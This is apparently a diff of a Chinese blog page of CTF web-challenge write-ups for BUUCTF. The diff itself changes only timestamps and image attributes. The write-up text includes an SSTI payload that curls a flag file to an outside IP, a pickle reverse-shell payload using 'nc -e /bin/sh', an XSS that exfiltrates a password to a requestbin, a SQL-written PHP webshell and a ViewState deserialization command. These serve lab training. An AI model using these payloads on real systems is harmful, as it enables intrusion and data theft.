@@ -55,7 +55,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/07/04/taoismt/23.png">
 <meta property="og:image" content="http://yoursite.com/2020/07/04/taoismt/24.png">
 <meta property="article:published_time" content="2020-07-04T02:25:19.000Z">
-<meta property="article:modified_time" content="2020-07-14T04:38:19.453Z">
+<meta property="article:modified_time" content="2020-07-14T05:07:55.615Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary">
@@ -244,7 +244,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-14 12:38:19" itemprop="dateModified" datetime="2020-07-14T12:38:19+08:00">2020-07-14</time>
+                <time title="Modified: 2020-07-14 13:07:55" itemprop="dateModified" datetime="2020-07-14T13:07:55+08:00">2020-07-14</time>
               </span>
 
           
@@ -264,15 +264,15 @@
 <p>这里有一篇文章payload很详细：<a href="https://www.cnblogs.com/hackxf/p/10480071.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
 <p>还有一个问题是没有给传入的参数，这里看了别的师傅的wp，用到了一个工具叫Arjun-master，可以找到传入的参数，get、post、json形式的都可以，readme.md文档里都有说明</p>
 <p>这里找一下</p>
-<img src="/2020/07/04/taoismt/1.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/1.png" class="">
 
 <p>一把梭赋值给name</p>
-<img src="/2020/07/04/taoismt/2.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/2.png" class="">
 
 <p>然后把popen里的参数改一下就可以了</p>
 <h3 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h3><p>整个网页找遍了也没找到点，扫一发也没发现什么东西</p>
 <p>google的F12有发现</p>
-<img src="/2020/07/04/taoismt/3.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/3.png" class="">
 
 <p>给了路径和参数，查询一下字段</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query?search=amazonis_planitia order by 2</span><br><span class="line"><span class="comment">#正常返回json数据，改为3返回2</span></span><br></pre></td></tr></table></figure>
@@ -287,7 +287,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query?search=amazonis_planitia%20union%20select%20group_concat(code),2%20from%20alien_code.code</span><br><span class="line"><span class="comment">#["flag&#123;e945022c-5205-409e-8a0c-a8fe4afd6742&#125;","2"]]</span></span><br></pre></td></tr></table></figure>
 
 <p>这里发现sqlmap一把梭也可以，直接贴图</p>
-<img src="/2020/07/04/taoismt/4.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/4.png" class="">
 
 <h3 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h3><p>打开，登录，可以上传文件</p>
 <p>随手上传图片马，只说了上传成功， 鉴于前面题目经验，在前端源码找到了路径，很遗憾，蚁剑连不上，看来不是这样做的</p>
@@ -299,10 +299,10 @@
 <p>判断文件高宽</p>
 <p>用finfo判断文件类型，getimagesize判断文件的宽度和高度，这里又要图片类型不能是PNG</p>
 <p>搜一下资料，破环图片的结构就能够避开getimagesize的检测，就能够让那个不是png类型的判断成立</p>
-<img src="/2020/07/04/taoismt/5.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/5.png" class="">
 
 <p>上传，成功</p>
-<img src="/2020/07/04/taoismt/6.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/6.png" class="">
 
 <h3 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h3><p>界面就一个输入框，以为会是SQL注入，if没有被打印出来，但是其他怎么测试都只会打印出输入的内容</p>
 <p>扫描，也没有什么发现</p>
@@ -323,14 +323,14 @@
 <p>下面直接读取flag文件即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(<span class="string">'curl http://174.2.11.217:8888/ -d `cat /flag_1s_Hera`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/07/04/taoismt/7.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/7.png" class="">
 
 <h3 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h3><p>看到题目，pickle，有点眼熟，搜一下，是python的pickle序列化漏洞没跑了</p>
 <p>直接找个payload改改</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval, (<span class="string">"__import__('os').system('nc 174.2.12.2 9999 -e/bin/sh')"</span>,))</span><br><span class="line">a = A()</span><br><span class="line">print( base64.b64encode( pickle.dumps(a) ) )</span><br><span class="line"><span class="comment">#gANjYnVpbHRpbnMKZXZhbApxAFg3AAAAX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3NC4yLjEyLjIgOTk5OSAtZS9iaW4vc2gnKXEBhXECUnEDLg==</span></span><br></pre></td></tr></table></figure>
 
 <p>网页替换掉cookie的值，开一台内网机监听端口，再点击bug flag</p>
-<img src="/2020/07/04/taoismt/8.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/8.png" class="">
 
 <h3 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h3><p>在控制台里发现login.js文件</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">''</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">'user'</span>]) != <span class="string">"undefined"</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">'psw'</span>]) != <span class="string">"undefined"</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">"username"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'user'</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">"password"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'psw'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -343,7 +343,7 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;<span class="regexp">/scrcookieipt&gt;</span></span><br><span class="line"><span class="regexp">&lt;scrcookieipt&gt;</span></span><br><span class="line"><span class="regexp">    var psw = docucookiement.getcookieElementsByName("password")[0].value;</span></span><br><span class="line"><span class="regexp">    docucookiement.locacookietion="http:/</span><span class="regexp">/http.requestbin.buuoj.cn/</span><span class="number">11</span>uk8c71/?a=<span class="string">"+psw;</span></span><br><span class="line"><span class="string">&lt;/scrcookieipt&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>RequestBin提供了一个URL，该URL将收集对其发出的请求，首页点击create a requestbin可以接收到flag</p>
-<img src="/2020/07/04/taoismt/9.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/9.png" class="">
 
 <h3 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h3><p>上传，随便上传一个，给了路径，蚁剑连不上</p>
 <p>有一个文件重命名，看到这就想到了二次注入，但是没有源码，所以，嘿嘿，GitHub嫖</p>
@@ -354,11 +354,11 @@
 <p>注意到<code>$re = $db-&gt;query(&quot;update file set filename=&#39;{$req[&#39;newname&#39;]}&#39;, oldname=&#39;{$result[&#39;filename&#39;]}&#39; where fid={$result[&#39;fid&#39;]}&quot;);</code></p>
 <p>这里把数据库里取出的文件名又再一次入库了，造成二次注入</p>
 <p>将数据库中extension字段的值改为空，同时也可以控制filename的值，那么等于能控制rename函数的两个参数的值，将extension改为空了，那么实际上数据库中的filename总比文件系统中真是的文件名少一个后缀。重新上传一个同名的文件，再重命名即可</p>
-<img src="/2020/07/04/taoismt/10.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/10.png" class="">
 
 <p>上传第一个图片，重命名为x.jpg</p>
 <p>再上传图片马，重命名为x.php即可getshell</p>
-<img src="/2020/07/04/taoismt/11.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/11.png" class="">
 
 <h3 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h3><p>注册登录，开始以为会有二次注入，但是在注册界面没有找到修改密码，登录之后在个人信息页面有个user_id，感觉应该是个点，异或一下，找对了</p>
 <p>经过测试过滤了select，union，单引号，找找资料，好像可以load_file来盲注，这里直接借用师傅跑出的文件的源码</p>
@@ -372,13 +372,13 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @b=<span class="number">0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027</span>;<span class="keyword">prepare</span> a <span class="keyword">from</span> @b;<span class="keyword">execute</span> a;</span><br><span class="line"><span class="comment">#set @b=SELECT '&lt;?php @eval($_POST[a]);?&gt;' into outfile '/var/www/html/favicon/shell.php';prepare a from @b;execute a;</span></span><br></pre></td></tr></table></figure>
 
 <p>将shell写入到该路径下的shell.php文件中，再去访问/favcion/shell.php，用蚁剑连接或者直接命令执行</p>
-<img src="/2020/07/04/taoismt/12.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/12.png" class="">
 
 <h3 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h3><p>直接登录，题目要求要用admin登录，is_admin的值在前端更改没有用，抓个包看看</p>
 <p>在响应里面有一个user的cookie字段，修改一下有报错，改两次，报错拼凑出完整的形式</p>
-<img src="/2020/07/04/taoismt/13.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/13.png" class="">
 
-<img src="/2020/07/04/taoismt/14.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/14.png" class="">
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;123&quot;,&quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure>
 
@@ -390,22 +390,22 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">'3e19f158a5ca37e168f8f211730e4443f712bf0bf7fc57699fda6d088e92c3269acbde72eef37640f1163e3bb9340bfa18119ee988184cf761924328f8ffb114719c0e3ec06178e9b71ab915fc0719b9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=s[:<span class="number">-32</span>]+s[<span class="number">32</span>:<span class="number">64</span>]+s[<span class="number">-32</span>:]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">'3e19f158a5ca37e168f8f211730e4443f712bf0bf7fc57699fda6d088e92c3269acbde72eef37640f1163e3bb9340bfa18119ee988184cf761924328f8ffb114f712bf0bf7fc57699fda6d088e92c326719c0e3ec06178e9b71ab915fc0719b9'</span></span><br></pre></td></tr></table></figure>
 
 <p>将新生成的cookie值进行替换就能以管理员的身份登录，拿到flag</p>
-<img src="/2020/07/04/taoismt/15.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/15.png" class="">
 
 <h3 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h3><p>上来直接给了源码，稍微整理一下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line">$MY = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'cat flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"functin SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">	$_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 
 <p>从源码就可以看出只要能够让$MY的函数能够执行就可以拿到flag</p>
 <p>查了一下,create_function()方法生成的函数是一个匿名函数</p>
-<img src="/2020/07/04/taoismt/16.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/16.png" class="">
 
 <p>并且这个匿名函数的格式还是固定的：%00lambda_%d,经过本地测试确实只有%d会改变</p>
-<img src="/2020/07/04/taoismt/17.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/17.png" class="">
 
 <p>下面就直接上exp吧，暴力简单</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(1000):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;46760534-c292-46ff-bdfa-7d0c850c9364.node3.buuoj.cn&#x2F;?func_name&#x3D;%00lambda_&#123;&#125;&#39;.format(i)</span><br><span class="line">    s &#x3D; requests.get(url)</span><br><span class="line">    print(s.text)</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/07/04/taoismt/18.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/18.png" class="">
 
 <p>半分钟不到的时间就能跑出来了，如果担心访问过快就加个sleep</p>
 <h3 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h3><p>给了源码</p>
@@ -425,7 +425,7 @@
 
 <p>查询根目录能够看到flag文件，读取一下拿到flag</p>
 <h3 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h3><p>打开是个登录界面，开始以为是直接注入，后来发现不对，试了一下有注册页面，注册一个账号登录</p>
-<img src="/2020/07/04/taoismt/19.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/19.png" class="">
 
 <p>看到url的格式，不是文件包含，但是应该可以用php伪协议读一下源码</p>
 <p>贴一下function.php的，user.php和guest.php没啥太有用的信息</p>
@@ -437,20 +437,20 @@
 <p>跟着提示接着访问m4aaannngggeee</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#m4aaannngggeee.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"templates/upload.html"</span>;</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/07/04/taoismt/20.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/20.png" class="">
 
 <p>以为是个文件上传，但是是个假的，来读取一下源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload fileï¼"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>.$filename.<span class="string">" | base64 -w 0"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/png;base64,"</span>.$picdata.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>很明显就能够看出这题是文件名注入</p>
 <p>访问一下前面两个路径，m4aaannngggeee是真的</p>
-<img src="/2020/07/04/taoismt/21.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/21.png" class="">
 
 <p>在这里上传文件，抓包修改文件名，测试发现/被过滤了，用..代替</p>
-<img src="/2020/07/04/taoismt/22.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/22.png" class="">
 
 <h3 id="BJDCTF-2nd-EasyAspDotNet"><a href="#BJDCTF-2nd-EasyAspDotNet" class="headerlink" title="[BJDCTF 2nd]EasyAspDotNet"></a>[BJDCTF 2nd]EasyAspDotNet</h3><p>这道题跟着赵总的wp做的，链接走一波：<a href="https://www.zhaoj.in/read-6497.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6497.html</a></p>
-<img src="/2020/07/04/taoismt/23.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/23.png" class="">
 
 <p>可以看到文件路径，尝试文件目录穿越读取web.config</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">validationKey</span>=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span> <span class="attr">decryptionKey</span>=<span class="string">"B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5"</span> <span class="attr">validation</span>=<span class="string">"SHA1"</span> <span class="attr">decryption</span>=<span class="string">"3DES"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -459,7 +459,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br></pre></td></tr></table></figure>
 
 <p>通过postman把生成的payload赋给__VIEWSTATE</p>
-<img src="/2020/07/04/taoismt/24.png" class="" title="examplename">
+<img src="/2020/07/04/taoismt/24.png" class="">
     </div>
 
     
